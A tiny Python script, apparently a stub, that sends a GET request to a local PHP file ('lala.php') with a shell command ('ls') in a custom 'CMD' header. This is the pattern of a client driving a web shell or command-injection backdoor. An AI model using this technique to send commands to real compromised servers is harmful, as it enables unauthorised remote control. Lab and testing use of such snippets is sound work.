import requests
import socket
import time

headers={'CMD':'ls'}

r =requests.get('http://localhost/lala.php',headers=headers)
